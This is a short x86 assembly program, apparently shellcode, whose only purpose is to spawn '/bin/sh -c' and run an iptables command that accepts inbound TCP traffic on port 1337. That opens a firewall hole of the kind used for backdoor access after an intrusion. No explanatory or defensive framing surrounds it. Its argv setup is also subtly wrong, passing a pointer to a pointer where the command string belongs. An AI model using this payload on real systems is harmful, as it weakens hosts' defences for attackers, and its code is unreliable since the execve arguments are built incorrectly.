section .data
    cmd     db '/sbin/iptables -A INPUT -p tcp --dport 1337 -j ACCEPT', 0
    sh      db '/bin/sh', 0
    dashc   db '-c', 0
    null    dd 0

section .text
    global _start

_start:
    ; execve("/bin/sh", ["/bin/sh", "-c", "iptables ...", NULL], NULL)
    xor eax, eax
    push eax             ; null terminator for cmd
    push cmd
    mov ebx, esp         ; pointer to command string

    push eax             ; null terminator
    push ebx             ; pointer to cmd string
    push dashc
    push sh
    mov ecx, esp         ; argv = ["/bin/sh", "-c", "cmd", NULL]

    xor edx, edx         ; envp = NULL
    mov al, 11           ; sys_execve
    mov ebx, sh          ; filename = "/bin/sh"
    int 0x80
